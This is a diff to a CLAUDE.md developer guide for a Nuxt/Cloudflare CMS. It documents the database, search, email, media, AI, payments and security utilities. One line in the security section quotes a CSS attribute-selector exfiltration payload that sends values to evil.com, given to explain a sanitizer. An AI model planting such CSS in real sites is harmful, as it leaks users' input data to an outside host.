@@ -5,11 +5,14 @@ This file provides guidance to Claude Code (claude.ai/code) when working with co
 ## Commands
 
 ```bash
-# Dev server (localhost:3000, SPA mode on Windows due to Named Pipe IPC workaround)
-pnpm dev
+# Password hashing runs in a separate Worker (ARGON2 service binding) that `wrangler dev`
+# does not start on its own — setup/login/registration all fail without it. Run once per
+# session, in its own terminal, before `pnpm dev`:
+#   cd workers/argon2-hasher && pnpm install && pnpm dev
 
-# Wrangler dev (closest to production — localhost:8787, D1 auto-provisioned)
-cd apps/nuxflow && wrangler dev
+# Dev server — runs `wrangler dev` under the hood (localhost:8787, D1 auto-provisioned).
+# This is the only supported local dev workflow; there is no separate `nuxt dev` path.
+pnpm dev
 
 # Unit tests (Vitest — tests/unit/**)
 pnpm test                                   # all packages
@@ -30,11 +33,11 @@ pnpm test:e2e
 pnpm typecheck
 pnpm lint
 
-# Database
+# Database — D1 only. Migrations apply automatically on cold start; there is no
+# manual migrate command.
 pnpm --filter @nuxflow/db generate      # generate migration after schema change
-pnpm --filter @nuxflow/db studio        # Drizzle Studio UI at https://local.drizzle.studio
-pnpm --filter @nuxflow/db migrate       # apply migrations via libSQL (Turso only)
-pnpm --filter @nuxflow/db migrate-fts   # apply FTS5 search index separately on Turso
+pnpm --filter @nuxflow/db studio        # Drizzle Studio — point DB_LOCAL_PATH at the
+                                         # local D1 sqlite file under apps/nuxflow/.wrangler/
 
 # Build and deploy — run from apps/nuxflow; wrangler handles the build step automatically
 cd apps/nuxflow && pnpm run deploy
@@ -49,7 +52,7 @@ cd apps/nuxflow && pnpm run deploy
 ```
 apps/nuxflow/          # Main Nuxt 4 app (the CMS)
 packages/canvas/       # Canvas page builder engine (blocks, editor, types) — @nuxflow/canvas
-packages/db/           # Drizzle schema, migrations, client factory
+packages/db/           # Drizzle schema and migrations (D1-only — no client factory)
 packages/plugin-sdk/   # Types for building dynamic plugins (NuxFlowPlugin interface)
 packages/cli/          # `nuxflow` CLI — scaffold, build, and deploy dynamic plugins/themes
 themes/default/        # Default CSS theme
@@ -60,15 +63,9 @@ docs/                  # User-facing documentation (markdown)
 
 ### Database layer
 
-`packages/db/src/client.ts` — libSQL/Turso client factory (`createDb`).
+Cloudflare D1 is the only supported database — there is no alternate backend. `apps/nuxflow/server/utils/db.ts` — `useDb(event)` returns a Drizzle instance backed by the D1 binding (`event.context.cloudflare.env.DB`), and throws a clear error if no binding is present. It also checks `globalThis.__env__?.DB` so it works inside Nitro scheduled tasks where no H3 event is available. `packages/db` exports only the schema (`@nuxflow/db/schema`) — there is no client factory, since D1 instances can only be constructed from a live binding, not a URL/token pair.
 
-`apps/nuxflow/server/utils/db.ts` — `useDb(event)` returns a Drizzle instance backed by either:
-- Cloudflare D1 binding (`event.context.cloudflare.env.DB`) — used in production
-- Turso/libSQL (`NUXT_TURSO_URL`) — used in local dev and Option C setup
-
-Both share the same Drizzle schema so queries are identical. D1 is preferred and detected first. `useDb()` also checks `globalThis.__env__?.DB` so it works inside Nitro scheduled tasks where no H3 event is available.
-
-**Migrations run automatically** on cold start via `server/middleware/00.migrate.ts`. SQL files are bundled into the Worker as server assets (`packages/db/migrations/`). Never hand-run migrations in production; just deploy. For schema changes: edit `packages/db/src/schema/*.ts`, run `pnpm --filter @nuxflow/db generate`, commit both the schema and the generated SQL.
+**Migrations run automatically** on cold start via `server/middleware/00.migrate.ts`. SQL files are bundled into the Worker as server assets (`packages/db/migrations/`). Never hand-run migrations in production; just deploy. For schema changes: edit `packages/db/src/schema/*.ts`, run `pnpm --filter @nuxflow/db generate`, commit both the schema and the generated SQL. Some migrations (virtual FTS5 tables, triggers) can't be expressed in Drizzle's schema DSL and are hand-written directly as `.sql` files — see `migrations/0002_search_index.sql`.
 
 Schema files in `packages/db/src/schema/`:
 
@@ -80,7 +77,11 @@ Schema files in `packages/db/src/schema/`:
 | `media.ts` | media, folders |
 | `forms.ts` | forms, submissions |
 | `payments.ts` | membership tiers, subscriptions |
-| `system.ts` | plugins, themes, audit logs, webhooks, `rate_limits` |
+| `system.ts` | plugins, themes, audit logs, webhooks, `rate_limits`, FTS5 `search_index` (raw SQL, see migrations) |
+
+### Search
+
+`GET /api/v1/search` queries the `search_index` FTS5 virtual table (title + porter-stemmed body) and is kept in sync automatically by SQLite triggers on `content_items` (`AFTER INSERT/UPDATE/DELETE`, defined in `migrations/0002_search_index.sql`) — there is no application-level indexing code, so every write path (API, setup wizard seeding, demo reset) stays in sync for free. Only `status = 'published' AND visibility = 'public'` items are indexed; the indexed body is `COALESCE(excerpt, seo_description, '')`, not the full rendered content.
 
 ### Multi-site and request context
 
@@ -160,11 +161,16 @@ Dynamic plugins require the Cloudflare Workers Paid plan. Without it the `LOADER
 
 ### Email
 
-`server/utils/email.ts` — `sendEmail(event, msg)` dispatches email through the provider configured in site settings. Supported providers: `resend`, `brevo`, `zepto`, `smtp` (relayed via MailChannels in Workers). Defaults to `console` log in dev when no provider is configured. Use `sendNotification()` from `server/utils/notify.ts` to persist an in-app notification and optionally send email in one call.
+`server/utils/email.ts` — `sendEmail(event, msg)` dispatches email through the provider configured in site settings. Supported providers:
+- `cloudflare` (**recommended**) — Cloudflare's native `send_email` Workers binding (`getEmailBinding()` in `cf-env.ts`). No third-party account or API key; requires `wrangler email sending enable <domain>` once per sending domain and a `[[send_email]]` binding named `EMAIL` in `wrangler.toml`.
+- `resend`, `brevo`, `zepto` — third-party API-key providers.
+- `smtp` — actually MailChannels, not generic SMTP. MailChannels' free anonymous relay for Cloudflare Workers requires an existing MailChannels account and DNS domain-lockdown records as of mid-2024 — most self-hosters won't have this. There is no host/user/pass to configure (MailChannels authorizes via sender-domain DNS, not credentials) — don't reintroduce those fields, they were removed because they never did anything.
+
+Defaults to `console` log in dev when no provider is configured. Use `sendNotification()` from `server/utils/notify.ts` to persist an in-app notification and optionally send email in one call.
 
 ### Media system
 
-**Provider abstraction** — `server/utils/media-providers/index.ts` exports `getActiveProvider(event): Promise<MediaProvider>`. It probes site settings and env vars in priority order: Cloudflare Images → S3 (`S3_BUCKET`) → Bunny (`BUNNY_API_KEY`) → local (base64 data URI fallback). The `MediaProvider` interface has `upload()`, `delete()`, and `getUrl()`. All image upload endpoints call `getActiveProvider()` rather than touching a specific storage SDK directly.
+**Provider abstraction** — `server/utils/media-providers/index.ts` exports `getActiveProvider(event): Promise<MediaProvider>`. Priority order: Cloudflare Images → S3 → Bunny → local (base64 data URI fallback). All three real providers are resolved identically via `resolveSetting(event, 'media.xxx', 'xxxRuntimeConfigKey')` — per-site DB setting first, `NUXT_`-prefixed env var fallback second — so a multi-site install can give different sites different buckets/zones, not just one global env var shared by every site. Configurable in Settings → Media, which writes to the same per-site settings `resolveSetting()` reads. The `MediaProvider` interface has `upload()`, `delete()`, and `getUrl()`. All image upload endpoints call `getActiveProvider()` rather than touching a specific storage SDK directly. The local fallback caps uploads at 512 KB (base64 stored directly in a D1 text column) and throws 413 above that — it's a last-resort path for when nothing else is configured, not a supported way to serve normal media.
 
 **EXIF extraction** — `server/utils/exif.ts` exports `extractExif(buffer: ArrayBuffer): ExifData | null`. Pure Web APIs, zero dependencies. Reads IFD0 (Make, Model) and ExifIFD (exposure, ISO, focal length, flash, dateTimeOriginal) from JPEG APP1 segments. Returns `null` for non-JPEG files or images with no EXIF. The upload handler calls this after a successful provider upload and stores the result in `media.metadata` as `{ exif: {...} }`. Errors are swallowed so they never fail the upload.
 
@@ -173,6 +179,8 @@ Dynamic plugins require the Cloudflare Workers Paid plan. Without it the `LOADER
 ### AI providers
 
 `server/utils/ai-sdk.ts` — `getAiSdkModel(event, quality)` returns an AI SDK `LanguageModel` for the provider configured in site settings (`ai.provider`). Supported providers: `openai`, `anthropic`, `gemini`, `deepseek`, `ollama`. Quality is `'fast'` (default) or `'smart'`, which selects a smaller vs larger model per provider. Returns `null` when the provider API key is missing — callers are expected to throw 503 on `null`. Use `aiErrorMessage(err)` to extract a user-friendly message from provider SDK errors.
+
+This is the only AI abstraction in the codebase — every route calls `getAiSdkModel()` plus `generateText()`/`generateObject()` from the `ai` package directly (see `generate-content.post.ts` for the `generateText` pattern, `grammar.post.ts` for `generateObject` with a Zod schema). There used to be a second, hand-rolled `AiProvider` interface (`ai-providers/`) used only by the simple single-string-completion routes; it was removed since `getAiSdkModel` + `generateText` covers that exact case with no loss of capability — don't reintroduce a parallel abstraction for "simple" completions.
 
 AI routes in `server/api/v1/ai/`:
 - `POST /improve` — rewrites a text field (improve / shorten / expand / simplify). Called by the canvas `FieldRenderer` inline AI menu.
@@ -183,7 +191,11 @@ AI routes in `server/api/v1/ai/`:
 Payment providers are abstracted in `server/utils/payments/`:
 - `StripeProvider` — products, prices, checkout sessions, billing portal, subscription cancel, webhook event construction
 - `LemonSqueezyProvider` — products, variants, checkout, portal, cancellation, webhook HMAC verification
-- `PaddleProvider` — analogous interface for Paddle Classic
+- `PaddleProvider` — subscription fetch/cancel and Ed25519 webhook verification. Checkout is **not** API-driven for Paddle — it redirects to a classic overlay checkout URL, so `PaddleProvider` has no `createCheckoutSession`/`createProduct` equivalent
+
+All three `implements PaymentProvider` (`payments/types.ts`) for the one operation genuinely identical across all three: `cancelSubscription(subscriptionId)`. Checkout creation and product/price sync are deliberately **not** part of that shared interface — Stripe/LS drive them through their APIs, Paddle doesn't, so forcing a common shape there would misrepresent the difference rather than remove real duplication.
+
+`server/utils/payments/webhook-sync.ts` — `upsertSubscriptionFromWebhook()` and `cancelSubscriptionFromWebhook()` hold the DB-write logic (tier lookup, existing-row check, insert/update, activation push) that used to be duplicated three times in the webhook handler. Each provider's webhook handler only parses its own raw payload into a `SubscriptionUpsert`/`SubscriptionCancellation` and calls the shared function — `pushOnActivation` is computed per-provider since each vocabulary differs on which specific event type should trigger a push (e.g. Lemon Squeezy/Paddle only push on their "created"/"activated" event, not "updated"/"resumed", even though those share the same upsert path).
 
 `server/utils/payments/gate.ts` — `resolveContentGate(event, settings)` checks `settings.access` (`'public'`, `'members'`, `'tier:<tierId>'`) against the caller's active subscription. Returns `GateResult | null` (null = access granted). Used internally by the public pages API.
 
@@ -242,9 +254,10 @@ Admin pages skip dark-mode and font injection (the admin has its own colour-mode
 
 ### Security utilities
 
-`server/utils/security.ts` — use these for any endpoint that fetches external URLs or processes archives:
+`server/utils/security.ts` — use these for any endpoint that fetches external URLs, processes archives, or stores theme CSS:
 - `isSafeUrl(urlStr)` — SSRF guard; returns `false` for private/loopback IPv4, private IPv6, `localhost`, `.local`, `.internal`, and non-HTTP(S) schemes
 - `validateZipArchive(data, maxUncompressedSize)` — parses the ZIP central directory without decompressing; throws 400 on path traversal (Zip Slip) and 413 on Zip Bomb; returns `{ fileCount, totalSize }`
+- `sanitizeThemeCss(css)` — strips `url()`, `@import`, `expression()`, and `</style>` from theme CSS before it's stored or injected. Theme CSS never legitimately needs external resources (fonts/images go through dedicated settings), so these are stripped outright rather than allow-listed — this closes the CSS attribute-selector exfiltration technique (`input[value^="a"] { background: url(https://evil.com/?a) }` leaks DOM attribute values with no JS needed). Called from the single write chokepoint `putThemeCSS()` in `cf-env.ts` (covers all 3 upload/patch/customizer routes automatically) and again at SSR injection time in `theme-resolver.ts` (idempotent — retroactively protects CSS stored before this existed, no data migration needed).
 
 ### Frontend routing
 
@@ -270,8 +283,7 @@ Admin pages live in `app/pages/admin/`. Super-admin-only pages (e.g. multi-site 
 
 ### Nuxt config notes
 
-- `ssr: process.env.NODE_ENV !== 'development'` — SSR disabled in dev on Windows to work around a Named Pipe IPC crash in `@nuxt/vite-builder@4.4.2 + Vite 7.3.x`
-- Nitro preset is `cloudflare-module` in production only
+- `ssr: true` and `nitro.preset: 'cloudflare-module'` unconditionally — dev only ever runs through `wrangler dev`, which always performs a production-mode build, so there's no separate dev-mode code path to special-case. (The old NODE_ENV-conditional split existed because `nuxt dev` was previously also a supported dev path and its Vite dev-server pipeline crashed on Windows with a Named Pipe IPC bug in `@nuxt/vite-builder@4.4.2 + Vite 7.3.x` — see nuxt/nuxt#34727. That path no longer exists, so the workaround was removed with it. If `nuxt dev` is ever reintroduced, re-check whether that upstream bug is still live before dropping the conditional again.)
 - `@opentelemetry/api` is stubbed via `nitro.alias` because Better Auth imports it optionally but it is not installed
 - Migrations SQL files are bundled via `nitro.serverAssets`
 - `nitro.experimental.tasks: true` is required for the `server/tasks/` system to function
